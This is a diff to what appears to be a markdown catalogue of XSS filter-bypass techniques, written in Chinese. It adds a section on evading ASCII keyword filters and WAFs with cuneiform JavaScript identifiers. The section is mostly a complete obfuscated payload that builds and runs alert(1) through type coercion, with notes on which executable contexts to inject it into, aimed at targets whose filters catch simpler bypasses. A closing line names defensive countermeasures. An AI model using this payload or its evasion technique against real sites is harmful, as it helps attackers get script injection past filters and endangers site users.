@@ -130,6 +130,19 @@ bracket form (`obj['al'+'ert']`) is matching the property-ACCESS syntax, not jus
 Use when a target's split-keyword form (already a known bypass) is itself being caught by a
 smarter rule; this is one layer past that.
 
+## Cuneiform（楔形文字）—— 星体平面标识符绕过 ASCII 关键词过滤
+
+WAF/过滤器若按 `[a-zA-Z]` 或常见符号做黑名单/正则，星体平面（astral plane）的楔形文字标识符直接逃逸 ——
+整条 payload 不含一个拉丁字母，`alert(1)` 靠类型强制转换 + 属性访问拼出（JSFuck 同思路的"古文字皮"）：
+
+```js
+𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
+```
+
+- 来源：PayloadsAllTheThings「XSS Filter Bypass → Bypass using Cuneiform」（@ethical_h4ck3r_ 2026-09 转播）。
+- 用法：放进可执行 JS 上下文（`<script>` / 事件处理器 / 外部 JS）。
+- 反制：输出编码 + 语法级过滤（CSP 兜底），别只做关键词黑名单。
+
 ## Wired sub-techniques
 
 <!-- auto-wired: context-reachable sub-technique pages -->
